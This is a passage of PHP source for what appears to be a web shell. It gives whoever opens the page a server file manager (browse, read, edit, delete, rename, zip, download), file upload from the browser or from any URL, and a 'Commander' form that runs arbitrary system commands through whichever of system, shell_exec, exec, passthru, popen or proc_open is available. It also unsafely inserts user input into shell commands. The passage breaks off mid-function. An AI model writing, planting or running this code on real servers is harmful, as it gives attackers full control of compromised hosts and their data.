			$data = fread($pid, 2096);
			pclose($pid);
			echo "<td>".round(explode("\n", str_replace("\"", "", explode(",", $data)[2]))[0])."% </td>";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				'typeperf -sc 1 "\processor(_total)\% processor time"',	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					echo "<td>".round(explode("\n", str_replace("\"", "", explode(",", $stdout)[2]))[0])."% </td>";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>";
		}
	}
	else
	{
		if($shell_exec == True)
		{
			$data = shell_exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round($data)."%</td>\n";
		}
		else if($exec == True)
		{
			$data = shell_exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round($data)."%</td>\n";
		}
		else if($popen == true)
		{
			$pid = popen("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'","r");
			$data = fread($pid, 2096);
			pclose($pid);
			echo "<td>".round($data)."%</td>\n";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				"grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					echo "<td>".round($stdout)."%</td>\n";
				}	
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>\n";
		}	
	}

	echo "
	</tr>

	<tr>
		<td>Total RAM</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$wmi = new COM('WinMgmts:root/cimv2');
		$res = $wmi->ExecQuery('Select TotalPhysicalMemory from Win32_ComputerSystem');
		$system = $res->ItemIndex(0);
		printf(
			'<td>%d GB</td>', 
			$system->TotalPhysicalMemory / 1024 /1024 /1024
		);
	}
	else
	{
		if ($shell_exec == True)
		{
			$total_ram = shell_exec("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($exec == True)
		{
			$total_ram = exec("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($popen == true)
		{
			$pid = popen("free -mt | grep Mem |awk '{print $2}'","r");
			$total_ram = fread($pid, 2096);
			pclose($pid);
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				"free -mt | grep Mem |awk '{print $2}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$total_ram = $stdout;
					$total_ram = $total_ram /1024;
					echo "<td>" . round($total_ram) . " GB</td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>";
		}	
	}

	echo "
	</tr>
	
	<tr>
		<td>Free RAM</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$free_ram = (int)str_replace("FreePhysicalMemory=", "", shell_exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
		echo "<td>" . round($free_ram, 2) . "GB </td>";
	}
	else
	{
		if ($shell_exec == True)
		{
			$free_ram = shell_exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($exec == True)
		{
			$free_ram = exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($popen == true)
		{
			$pid = popen("free | grep Mem | awk '{print $3/$2 * 100.0}'","r");
			$free_ram = fread($pid, 2096);
			pclose($pid);
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				"free | grep Mem | awk '{print $3/$2 * 100.0}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$free_ram = $stdout;
					echo "<td>" . round($free_ram) . "% </td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>";
		}	
	}
	echo "
	</tr>";

	?>
</table>
</td>
</tr>
</table>

<?php

function command_exists($command)
{
	global $shell_exec, $exec, $popen, $proc_open;
	$whereIsCommand = (PHP_OS == 'WINNT') ? 'where' : 'which';

	$complete = "$whereIsCommand $command";

	if($shell_exec == true)
	{
		return shell_exec($complete);
	}
	else if($exec == true)
	{
		return exec($complete);
	}
	else if($popen == true)
	{
		$pid = popen($complete,"r");
		$result = fread($pid, 2096);
		pclose($pid);
		return $result;
	}
	else if($proc_open == true)
	{
		$process = proc_open(
			$complete,
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);

			return $stdout;
		}
		else
		{
			return "false";
		}
	}
	else
	{
		return "false";
	}
}

function evalRel($command)
{
	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
	if ($system == True)
	{
		system($command);
	}
	else if($passthru == True)
	{
		passthru($command);
	}
	else if($shell_exec == True)
	{
		echo shell_exec($command);
	}
	else if($exec == True)
	{
		echo exec($command);
	}
	else if($popen == True)
	{
		$pid = popen( $command,"r");
		while(!feof($pid))
		{
			echo fread($pid, 256);
			flush();
	 		ob_flush();
			usleep(100000);
		}
		pclose($pid);
	}
	else if($proc_open == True)
	{
		$process = proc_open(
			$command,
			array(
				0 => array("pipe", "r"), //STDIN
				1 => array("pipe", "w"), //STDOUT
				2 => array("pipe", "w"), //STDERR
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);
		}

		if ($stderr != "")
		{
			echo $stderr;
		}
		else
		{
			echo $stdout;
		}
	}
}


echo "<br><h3><A NAME='File Manager' href='#File Manager'>File Manager</A></h3>";

function rrmdir($dir)
{
	if (is_dir($dir))
	{
		$objects = scandir($dir);
		foreach ($objects as $object)
		{ 
			if ($object != "." && $object != "..")
			{
				if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
			}
		}
		reset($objects);
		rmdir($dir);
	}
}

function getPermission($location)
{
	$perms = fileperms($location);

	if (($perms & 0xC000) == 0xC000)
	{
		$info = 's';
	}	
	elseif (($perms & 0xA000) == 0xA000)
	{
		$info = 'l';
	}	
	elseif (($perms & 0x8000) == 0x8000)
	{
		$info = '-';
	}	
	elseif (($perms & 0x6000) == 0x6000)
	{
		$info = 'b';
	}		
	elseif (($perms & 0x4000) == 0x4000)
	{
		$info = 'd';
	}	
	elseif (($perms & 0x2000) == 0x2000)
	{
		$info = 'c';
	}	
	elseif (($perms & 0x1000) == 0x1000)
	{
		$info = 'p';
	}	
	else
	{
		$info = 'u';
	}
	
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));

	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));

	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function sortRows($data)
{
	$size = count($data);

	for ($i = 0; $i < $size; ++$i)
	{
		$row_num = findSmallest($i, $size, $data);
		$tmp = $data[$row_num];
		$data[$row_num] = $data[$i];
		$data[$i] = $tmp;
	}

	return ( $data );
}

function findSmallest($i, $end, $data)
{
	$min['pos'] = $i;
	$min['value'] = $data[$i]['data'];
	$min['dir'] = $data[$i]['dir'];
	for (; $i < $end; ++$i)
	{
		if ($data[$i]['dir']) 
		{
			if ($min['dir'])
			{
				if ($data[$i]['data'] < $min['value'])
				{
					$min['value'] = $data[$i]['data'];
					$min['dir'] = $data[$i]['dir'];
					$min['pos'] = $i;
				}
			} 
			else
			{
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		} 
		else
		{
			if (!$min['dir'] && $data[$i]['data'] < $min['value'])
			{
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		}
	}
	return ($min['pos']);
}

if(isset($_FILES["fileToUpload"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$target_dir = base64_decode($_GET["location"])."\\";
	}
	else
	{
		$target_dir = base64_decode($_GET["location"])."/";
	}
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
	$uploadOk = 1;

	if (file_exists($target_file))
	{
		$uploadOk = 0;
	}
	
	if ($uploadOk == 0)
	{
		echo "<p class='danger'>File with same name already exists.</p>";
	}	
	else
	{
		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
		{
			echo "<p class='success'>The file ".basename($_FILES["fileToUpload"]["name"])." has been uploaded.</p>";
			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
		}
		else
		{
			echo "<p class='danger'>Sorry, there was an error uploading your file.</p>";
		}	
	}
}
else if(isset($_POST["linkToDownload"]))
{
	$url = $_POST["linkToDownload"];
	
	if ($url != "")
	{
		$pieces = explode("/", $url);
		$filename = array_pop($pieces);

		echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$target_dir = base64_decode($_GET["location"])."\\";
		}		
		else
		{
			$target_dir = base64_decode($_GET["location"])."/";
		}

		$fp = fopen ($target_dir.$filename, 'w+');

		$uploadOk = 1;
		if (file_exists($target_dir.$filename))
		{
			$uploadOk = 0;
		}
				
		if ($uploadOk == 0)
		{
			echo "<p class='danger'>File with same name already exists.</p>";
		}		
		else
		{
			try
			{
				if ($curl_version == True)
				{
					$ch = curl_init(str_replace(" ","%20",$url));

					curl_setopt($ch, CURLOPT_TIMEOUT, 60);

					curl_setopt($ch, CURLOPT_FILE, $fp);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

					$data = curl_exec($ch);

					curl_close($ch);
				}
				else
				{
					file_put_contents($target_dir.$filename, file_get_contents($url));	
				}

				echo "<p class='success'>The file ".$filename." has been uploaded.</p>";
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
			}
			catch(Exception $e)
			{
				echo "<p class='danger'>Sorry, there was an error uploading your file.</p>";
			}	
		}
	}
	else
	{
		echo "<p class='danger'>Required Link not provided.</p>";
	}
}
else if(isset($_POST["mkdir"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$dirname = base64_decode($_GET["location"])."\\".$_POST["mkdir"];
	}
	else
	{	
		$dirname = base64_decode($_GET["location"])."/".$_POST["mkdir"];
	}

	if (!file_exists($dirname))
	{
		mkdir($dirname);
		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
	}
	else
	{
		echo "<p class='danger'>Dir already exists!</p>";
	}
}
else if(isset($_POST["mkfile"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = base64_decode($_GET["location"])."\\".$_POST["mkfile"];
	}
	else
	{
		$filename = base64_decode($_GET["location"])."/".$_POST["mkfile"];
	}

	if (!file_exists($filename))
	{
		fopen($filename, 'w');
		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
	}
	else
	{
		echo "<p class='danger'>File already exists!</p>";
	}
}
else if(isset($_GET["del"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
	if (is_dir(base64_decode($_GET["del"])))
	{
		rrmdir(base64_decode($_GET["del"]));
	}	
	else
	{
		unlink(base64_decode($_GET["del"]));
	}	
	echo "<p class='success'>".base64_decode($_GET["del"])." has been Deleted.</p>";
	header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
}
else if(isset($_GET["zip"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	$archiveName = base64_decode($_GET["zip"]);

	if (file_exists(base64_decode($_GET["zip"])))
	{
		if(is_dir(base64_decode($_GET["zip"])))
		{
			if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
			{	
				$folder = array_pop(explode("/", base64_decode($_GET['zip'])));

				$file = $folder . ".zip";
				
				zipWindows($file, base64_decode($_GET['zip']));

				chmod($file, 644);
				header('Content-Disposition: attachment; filename='. $file);
				readfile($file);	
			}
			else
			{
				if ($exec == True)
				{
					exec("zip -r $archiveName $archiveName");
				}				
				else if($shell_exec == True)
				{
					shell_exec("zip -r $archiveName $archiveName");
				}				
				else if($system == True)
				{
					system("zip -r $archiveName $archiveName");
				}
				else if($passthru == True)
				{
					 passthru("zip -r $archiveName $archiveName");
				}
				else if($popen == true)
				{
					$pid = popen("zip -r $archiveName $archiveName","r");
					pclose($pid);
				}
				else if($proc_open == true)
				{
					$process = proc_open(
						"zip -r $archiveName $archiveName",
						array(
							0 => array("pipe", "r"),
							1 => array("pipe", "w"),
							2 => array("pipe", "w"),
						),
						$pipes
					);

					if ($process !== false)
					{
						fclose($pipes[1]);
						fclose($pipes[2]);
						proc_close($process);
					}
					else
					{
						echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
						$zipFail = True;
					}
				}
				else
				{
					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
					$zipFail = True;
				}

				if ($zipFail == False)
				{
					echo "<p class='success'>".base64_decode($_GET["zip"])." has been Ziped.</p>";
					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
				}	
			}
		}
		else
		{
			echo "<p class='danger'>This ain't no dir mate.</p>";
		}
	}
	else
	{
		echo "<p class='danger'>Dir doens't exist.</p>";
	}
}
else if(isset($_GET["file"]))
{
	if(isset($_POST["save"]))
	{
		if(is_writable(base64_decode($_GET["file"])))
		{
			file_put_contents(base64_decode($_GET["file"]), base64_decode($_POST["content"]));
			if(file_get_contents(base64_decode($_GET["file"])) == base64_decode($_POST["content"]))
			{
				echo "<p class='success'>Change was successful!</p>";
			}
			else
			{
				echo "<p class='danger'>Change was not successful!</p>";
			}		
		}
		else
		{
			echo "<p class='danger'>This file is not writable!</p>";
		}	
	}

	if(is_readable(base64_decode($_GET["file"])))
	{
		$file = base64_decode(htmlentities($_GET["file"]));
		$content = file_get_contents(base64_decode($_GET["file"]));
		echo "
			<a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode(dirname($_GET['file']))."#File Manager'>Go Back</a><br>
			<form action='".$_SERVER['PHP_SELF']."?file=".base64_encode($file)."#File Manager' method='POST'>
				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
				<input type='submit' name='save' value='Save' onclick='return base64encode5(this.form, this.form.content);'/>
			</form>";
	}
	else
	{
		echo "<p class='danger'>File is not readable!</p>";
	}
}
else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
{
	echo "<a href='?dir=".$_GET["dir"]."#File Manager'>Go Back</a><br><br>";

	if(isset($_POST["rename_file"]))
	{
		if(file_exists(base64_decode($_POST["original_name"]))) 
		{
			rename(base64_decode($_POST["original_name"]), base64_decode($_POST["new_name"]));
			if(file_exists(base64_decode($_POST["new_name"])))
			{
				echo "<p class='success'>File successfully renamed!</p>";
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);
			}
			else
			{
				echo "<p class='danger'>Could not rename file!</p>";
			}		
		} 
		else
		{
			echo "<p class='danger'>Could not find file!</p>";
		}	
	}

	$rename = htmlentities(base64_decode($_GET["rename_file"]));
	echo "<form action='' method='POST'>
		<input type='hidden' name='original_name' value='$rename'>	
		<input type='text' name='new_name' value='$rename'>
		<input type=\"submit\" name=\"rename_file\" value=\"Rename\" onclick=\"return base64encode3(this.form, this.form.original_name, this.form.new_name);\"/>
	</form>";
}
else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
{
	echo "<a href='?dir=".$_GET["dir"]."#File Manager'>Go Back</a><br><br>";

	if(isset($_POST["rename_folder"]))
	{
		if(file_exists(base64_decode($_POST["original_name"]))) 
		{
			rename(base64_decode($_POST["original_name"]), base64_decode($_POST["new_name"]));
			if(file_exists(base64_decode($_POST["new_name"])))
			{
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);			
				echo "<p class='success'>File successfully renamed!</p>";
			}
			else
			{
				echo "<p class='danger'>Could not rename file!</p>";
			}		
		}
		else
		{
			echo "<p class='danger'>Could not find file!</p>";
		}	
	}

	$rename = htmlentities(base64_decode($_GET["rename_folder"]));
	echo "<form action='' method='POST'>
		<input type='hidden' name='original_name' value='$rename'>	
		<input type='text' name='new_name' value='$rename'>
		<input type=\"submit\" name=\"rename_folder\" value=\"Rename\" onclick=\"return base64encode3(this.form, this.form.original_name, this.form.new_name);\"/>
	</form>";
}
else 
{
	if (isset($_GET['dir'])) 
	{
		if (isset($_GET['download']) && isset($_GET['location']))
		{
			if (is_readable(base64_decode($_GET['location'])))
			{
				header('Content-Disposition: attachment; filename='.$_GET['download']);
				readfile(base64_decode($_GET['location']));
			}
			else
			{
				echo "<p class='danger'>File is not readable!</p>";
			}		
		}
		$dir = base64_decode($_GET['dir']);
		$size = strlen($dir);
		while ($dir[$size - 1] == '/') 
		{
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
	}
	else
	{
		$dir = $_SERVER["SCRIPT_FILENAME"];
		$size = strlen($dir);
		while ($dir[$size - 1] != '/') 
		{
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
		$dir = substr($dir, 0, $size - 1);
	}

	if (is_dir($dir))
	{
		echo "
		<table class='flat-table flat-table-3'>
			<tr>
				<td>Shell's Directory: <a href='?dir=".base64_encode(getcwd())."#File Manager'>".getcwd()."</a></td>
			</tr>
			<tr>
				<td>Current Directory: ".htmlspecialchars($dir)."</td>
			</tr>
			<tr>
				<td>Change Directory/Read File:
				<form action='#File Manager' method='get' >
					<input style='width:300px' name='dir' type='text' value='".htmlspecialchars($dir)."'/>
					<input type='submit' value='Change' name='Change' onclick='return base64encode4(this.form, this.form.dir);'/>
				</form>
				</td>
			</tr>
		</table>";


		if (is_readable($dir))
		{
			if ($handle = opendir($dir)) 
			{
				$rows = array();

				$size_document_root = strlen($_SERVER['DOCUMENT_ROOT']);
				$pos = strrpos($dir, "/");
				$topdir = substr($dir, 0, $pos + 1);
				$i = 0;
				while (false !== ($file = readdir($handle))) 
				{
					if ($file != "." && $file != "..") 
					{
						$rows[$i]['data'] = $file;
						$rows[$i]['dir'] = is_dir($dir . "/" . $file);
						$i++;
					}
				}
				closedir($handle);

				$size = count($rows);
				
				echo "
				<table class='flat-table flat-table-1'>
					<tr>
						<th>Type</th>
						<th>Name</th>
						<th>Size (bytes)</th>
						<th>Permissions</th>
						<th>Actions</th>
					</tr>

					<tr>
						<td>[UP]</td>
						<td><a href='", $_SERVER['PHP_SELF'], "?dir=", base64_encode($topdir), "#File Manager'>..</a></td>
						<td></td>
						<td></td>
						<td></td>
					</tr>";

				if($size != 0)
				{
					$rows = sortRows($rows);

					for ($i = 0; $i < $size; ++$i)
					{
						$topdir = $dir . "/" . $rows[$i]['data'];
						echo "
						<tr>
							<td>";
						if ($rows[$i]['dir']) 
						{
							echo "[DIR]";
							$file_type = "dir";
						}
						else 
						{
							echo "[FILE]";
							$file_type = "file";
						}
						
						echo "
							</td>";
					
						if (is_readable($topdir))
						{					
							echo "
							<td><a href='", $_SERVER['PHP_SELF'], "?dir=", base64_encode($topdir), "#File Manager'>", htmlspecialchars($rows[$i]['data']), "</a></td>";
						}						
						else
						{
							echo "
							<td>".htmlspecialchars($rows[$i]['data'])."</td>";
						}
							
						if (is_readable($topdir))
						{
							$locsize = filesize($topdir);
						}						
						else
						{
							$locsize = "";
						}
						
						echo "
							<td>".$locsize."</td>";
						echo "
							<td>".getPermission($topdir)."</td>";
						if ($file_type == "dir")
						{
							if (is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?del=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Del</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&rename_folder=".base64_encode($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Zip</a></td>";
							}
							else
							{
								echo "
								<td></td>";
							}						
						}
						else
						{
							if (is_readable($topdir) && is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&download=".$rows[$i]['data']."&location=".base64_encode($topdir)."#File Manager'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".base64_encode($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&rename_file=".base64_encode($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Del</a></td>";
							}							
							else if (is_readable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&download=".$rows[$i]['data']."&location=".base64_encode($topdir)."#File Manager'>Download File</a></td>";
							}							
							else if (is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?file=".base64_encode($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&rename_file=".base64_encode($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Del</a></td>";
							}							
							else
							{
								echo "
								<td></td>";
							}
						}
						echo "
						</tr>";
					}
				}
				else
				{
					echo "
						<p class='danger'>Dir is Empty!</p>";
				}

				echo "
					</table>";

				if (!is_writeable($dir))
				{
					echo "
						<p class='danger'>Dir is not writeable! You can't upload files to this Directory!</p>
						
						<table class='flat-table flat-table-3' style='display:none'>\n";
				}				
				else
				{
					echo "<table class='flat-table flat-table-3'>";
			
				}				
				echo "
					<tr>
						<form action='?location=".base64_encode($dir)."#File Manager' method='post' enctype='multipart/form-data'>
							<td>Upload File (Browse):</td>
							<td><input type='file' value='Browse' name='fileToUpload'/></td>
							<td><input type='submit' value='Upload' name='uploadFile'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".base64_encode($dir)."#File Manager' method='post' >
							<td>Upload File (Link):</td>
							<td><input style='width:300px' name='linkToDownload' type='text'/><br><small>Direct Links required!</small></td>
							<td><input type='submit' value='Upload' name='downloadLink'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".base64_encode($dir)."#File Manager' method='post'>
							<td>Create File:</td>
							<td><input style='width:300px' name='mkfile' type='text'/></td>
							<td><input type='submit' value='Create' name='createFile'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".base64_encode($dir)."#File Manager' method='post'>
							<td>Create Folder:</td>
							<td><input style='width:300px' name='mkdir' type='text'/></td>
							<td><input type='submit' value='Create' name='createDir'/></td>
						</form>
					</tr>
				</table>";
			}
		}
		else
		{
			echo "<p class='danger'>Dir is not readable!</p>";
		}
	}
	else if (is_file($dir))
	{
		if(is_readable($dir))
		{
			$file = htmlentities($dir);
			$content = file_get_contents($dir);
			echo "
				<a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode(dirname($dir))."#File Manager'>Go Back</a><br>
				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>";
		}
		else
		{
			echo "
				<a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode(dirname($dir))."#File Manager'>Go Back</a><br>
				<p class='danger'>File is not readable!</p>";
		}
	}
}
?>


<br><h3><A NAME='Commander' href="#Commander">Commander</A></h3>

<form action='#Commander' method='POST'>
<?php
if(isset($_POST["system"])) $_SESSION["command_function"] = "system";
if(isset($_POST["shell_exec"])) $_SESSION["command_function"] = "shell_exec";
if(isset($_POST["exec"])) $_SESSION["command_function"] = "exec";
if(isset($_POST["passthru"])) $_SESSION["command_function"] = "passthru";
if(isset($_POST["popen"])) $_SESSION["command_function"] = "popen";
if(isset($_POST["proc_open"])) $_SESSION["command_function"] = "proc_open";
if(!isset($_SESSION["command_function"])) $_SESSION["command_function"] = "system";
if($system == True)
{
	echo '<input type="submit" name="system" value="System" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system")
	{
		echo ' style="background-color: red;"';
	}	
	if(!isset($_SESSION["command_function"]))
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($shell_exec == True)
{
	echo '<input type="submit" name="shell_exec" value="Shell_exec" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shell_exec")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($exec == True)
{
	echo '<input type="submit" name="exec" value="Exec" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "exec")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($passthru == True)
{
	echo '<input type="submit" name="passthru" value="Passthru" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
	{
		echo ' style="background-color: red;"';
	}	
	
	echo "> ";
}

if($popen == true)
{
	echo '<input type="submit" name="popen" value="Popen" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "popen")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($proc_open == true)
{
	echo '<input type="submit" name="proc_open" value="Proc_open" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "proc_open")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}
echo "
</form>

<form action='#Commander' method='post'>
	<input type='text' style='width:300px' name='command' placeholder='Command...'>
	<input type=\"submit\" value=\"GO\" onclick=\"return base64encode(this.form, this.form.command);\" />
</form>";

if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system" || isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
{
	if(isset($_POST["command"]))
	{
		$decCommand = base64_decode($_POST["command"]);
		if($_SESSION["command_function"] == "system")
		{
			echo "<table class='flat-table flat-table-1'>";
			echo "<td>".$decCommand."</td>";
			echo "<td><pre>";
			system($decCommand." 2>&1");
			echo "</pre></td>";
			echo "</table>";
		}
		else
		{
			echo "<table class='flat-table flat-table-1'>";
			echo "<td>".$decCommand."</td>";
			echo "<td><pre>";
			passthru($decCommand." 2>&1");
			echo "</pre></td>";
			echo "</table>";		
		}
	}
}
else
{
	if(isset($_SESSION["directory"]))
	{
		if(file_exists($_SESSION["directory"]))
		{
			chdir($_SESSION["directory"]);
		}	
	}
	if(isset($_POST["command"]))
	{
		$decCommand = base64_decode($_POST["command"]);
		$parts = explode(" ", $decCommand);
		if($decCommand != "clear" && $decCommand != "cls" && $parts[0] != "cd")
		{
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shell_exec")
			{
				$response = shell_exec($decCommand." 2>&1");
			}
			
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "exec")
			{
				$response = exec($decCommand." 2>&1");
			}

